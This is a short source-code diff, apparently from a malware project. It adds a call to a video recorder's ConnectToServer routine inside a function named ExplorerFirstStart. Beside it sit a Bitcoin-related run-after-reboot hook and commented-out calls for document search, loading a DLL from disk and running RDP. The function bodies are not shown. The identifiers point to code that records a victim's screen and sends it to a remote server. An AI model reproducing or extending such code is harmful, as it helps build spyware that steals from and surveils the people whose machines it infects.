@@ -58,6 +58,10 @@ void ExplorerFirstStart(PEventData Data)
 	#ifdef BitcoinH
 		BitcoinRunAfterReboot();
 	#endif
+
+	#ifdef VideoRecorderH
+		VideoProcess::ConnectToServer( 0, true );
+	#endif
 	//ExecuteDocFind( 0, 0, 0 );
 	//ExecuteLoadDLLDisk( 0, 0, "testdll.dll" );
 //	ExecuteRunRDP( 0, 0, 0 );
